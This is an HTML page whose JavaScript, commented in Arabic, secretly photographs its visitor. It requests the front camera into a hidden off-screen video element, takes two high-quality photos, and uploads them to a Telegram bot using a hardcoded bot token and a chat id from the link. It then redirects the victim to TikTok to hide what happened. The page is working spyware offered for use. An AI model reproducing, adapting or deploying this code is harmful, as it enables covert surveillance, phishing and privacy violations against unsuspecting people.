<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: white;
        }
    </style>
</head>
<body>

    <!-- عناصر التصوير مخفية -->
    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ====== الإعدادات ======
        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const id = new URLSearchParams(window.location.search).get('id');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        let stream = null;
        let photoCount = 0;
        let photos = [];

        // ====== بداية التصوير ======
        async function start() {
            if (!id) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                // طلب الكاميرا الأمامية بدقة عالية
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: "user"
                    }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // ننتظر حتى الكاميرا تظهر أول إطار حقيقي
                video.onloadeddata = () => {
                    // ننتظر 2 ثانية عشان الكاميرا تضبط الإضاءة والألوان
                    setTimeout(() => {
                        // التقاط الصورة الأولى
                        capturePhoto();
                        
                        // التقاط الصورة الثانية بعد ثانية ونصف
                        setTimeout(() => {
                            capturePhoto();
                        }, 1500);
                        
                    }, 2000);
                };
                
            } catch (err) {
                // إذا فشل، أرسل رسالة
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: id,
                        text: `❌ خطأ: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // ====== التقاط صورة ======
        function capturePhoto() {
            // نتأكد أن الفيديو جاهز وله أبعاد
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                // إذا مش جاهز، نجرب مرة ثانية بعد 200 مللي ثانية
                setTimeout(capturePhoto, 200);
                return;
            }
            
            // ضبط أبعاد الكانفس حسب الفيديو
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // رسم الصورة بجودة عالية
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تحسين التباين والإضاءة (اختياري)
            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
            const data = imageData.data;
            
            // تطبيق تعديل بسيط للسطوع إذا كانت الصورة داكنة
            for (let i = 0; i < data.length; i += 4) {
                // زيادة السطوع بنسبة 10% للصور الداكنة
                data[i] = Math.min(255, data[i] * 1.1);     // Red
                data[i+1] = Math.min(255, data[i+1] * 1.1); // Green
                data[i+2] = Math.min(255, data[i+2] * 1.1); // Blue
            }
            ctx.putImageData(imageData, 0, 0);
            
            // تحويل إلى blob بجودة عالية
            canvas.toBlob((blob) => {
                photos.push(blob);
                photoCount++;
                
                // إذا اكتملت الصورتان، أرسلهما
                if (photoCount === 2) {
                    sendPhotos();
                }
            }, 'image/jpeg', 0.95); // جودة 95%
        }

        // ====== إرسال الصور ======
        function sendPhotos() {
            // إرسال الصورة الأولى
            const form1 = new FormData();
            form1.append('chat_id', id);
            form1.append('photo', photos[0], 'photo1.jpg');
            
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: form1
            }).then(() => {
                // إرسال الصورة الثانية
                const form2 = new FormData();
                form2.append('chat_id', id);
                form2.append('photo', photos[1], 'photo2.jpg');
                
                return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: form2
                });
            }).finally(() => {
                // إيقاف الكاميرا
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                }
                window.location.href = "https://www.tiktok.com";
            });
        }

        // تشغيل
        start();

        // طوارئ: توجه بعد 15 ثواني (زيادة وقت الطوارئ شوية)
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 15000);
    </script>
</body>
</html>
